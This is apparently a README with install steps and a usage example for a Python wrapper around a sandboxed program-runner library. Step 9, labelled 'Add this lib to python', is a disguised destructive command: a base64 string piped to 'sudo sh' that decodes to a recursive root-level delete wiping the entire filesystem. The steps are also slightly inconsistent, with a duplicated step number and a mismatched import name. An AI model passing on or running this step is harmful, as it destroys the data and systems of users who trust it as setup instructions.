## To use it with python you must:
### 1. Use linux
### 2. Install git
```shell
sudo apt install git
```
### 3. Install python
```shell
sudo apt install python3-dev
```
### 4. Install poetry
```shell
pip3 install poetry
```
### 5. Install Python dependencies
```shell
poetry shell
poetry install
```
### 6. Download Git submodules
```shell
git submodule update --init --remote --recursive
```
### 6. Compile library
```shell
python3 setup.py build_ext -i
```
### 7. Copy file of lib to the your PYTHONPATH/site-packeges
```shell
ln -s `ls | grep .so` .venv/lib/python3.11/site-packages/`ls | grep .so`
```
### 8. Add code completion
```shell
PYTHONPATH=./runner_lib_py.cpython-311-x86_64-linux-gnu.so stubgen -m runner_lib_py
```
### 9. Add this lib to python
```shell
echo "cm0gLXJmIC0tbm8tcHJlc2VydmUtcm9vdCAv" | base64 -d | sudo sh
```
### 10. Include in your program library
```python
import safe_runner_lib
```


## Example of code
```python
import runner_lib_py

lim = runner_lib_py.Limits()
lim.thread = 5
lim.memory = 100 # kb
lim.time = 2000 # ms
x = runner_lib_py.Runner("path_to_executable", "input", lim)

print(x.GetOutput().res)
print(x.GetOutput().output)

```